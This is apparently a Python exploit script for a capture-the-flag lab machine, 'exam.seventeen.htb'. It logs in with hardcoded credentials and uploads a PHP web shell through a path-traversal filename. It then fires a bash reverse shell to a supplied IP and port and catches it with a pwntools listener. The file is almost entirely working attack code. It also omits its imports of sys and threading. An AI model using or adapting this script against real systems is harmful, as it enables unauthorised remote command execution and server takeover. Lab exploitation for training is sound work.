import requests
import os
import time
from pwn import *

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <IP> <PORT>")
    exit()

def shellUpload():
    login = {
            'stud_no': '31234',
            'password': 'autodestruction',
            'login': ''
            }
    sess = requests.Session()
    sess.post("http://exam.seventeen.htb:8000/oldmanagement/", data=login)
    phpid = sess.cookies.get_dict()
    phpid = phpid.get('PHPSESSID')
    cookies = {'PHPSESSID': phpid}
    headers = {'Content-Type': 'multipart/form-data; boundary=---------------------------377972973213553088171847731505'}
    #print(cookies)
    data = '-----------------------------377972973213553088171847731505\r\nContent-Disposition: form-data; name="file"; filename="../shell3.php"\r\nContent-Type: application/x-php\r\n\n <?php system($_GET[\'cmd\']);?>\n\r\n-----------------------------377972973213553088171847731505\r\nContent-Disposition: form-data; name="stud_no"\r\n\r\n31234../../\r\n-----------------------------377972973213553088171847731505\r\nContent-Disposition: form-data; name="save"\r\n\r\n\r\n-----------------------------377972973213553088171847731505--\r\n'
    response = requests.post('http://exam.seventeen.htb:8000/oldmanagement/save_file.php', cookies=cookies, data=data, headers=headers)
    #print(response.text)
    time.sleep(2)
    url = "http://exam.seventeen.htb:8000/oldmanagement/files/shell3.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{}/{}+0>%261'".format(sys.argv[1], sys.argv[2])
    e=requests.get(url)
    print(e.text)   
    return

def ShellStart():
    r = listen(sys.argv[2], timeout=10).wait_for_connection()
    r.sendline(b"whoami")
    r.interactive()

t = threading.Thread(target=ShellStart)
t.start()

shellUpload()
